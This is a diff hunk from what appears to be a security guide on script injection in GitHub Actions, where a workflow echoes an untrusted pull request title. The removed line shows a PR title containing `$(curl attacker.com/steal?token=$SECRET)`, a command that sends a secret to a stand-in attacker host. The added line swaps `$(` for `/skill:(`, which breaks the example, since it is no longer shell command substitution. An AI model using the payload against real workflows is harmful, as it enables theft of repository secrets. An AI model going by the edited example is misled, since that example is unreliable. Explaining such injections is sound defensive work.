@@ -82,7 +82,7 @@ posts are not enforcement evidence.
 - run: echo "${{ github.event.pull_request.title }}"
 ```
 
-An attacker opens a PR with title `$(curl attacker.com/steal?token=$SECRET)`.
+An attacker opens a PR with title `/skill:(curl attacker.com/steal?token=$SECRET)`.
 Fix: use environment variables.
 
 ```yaml
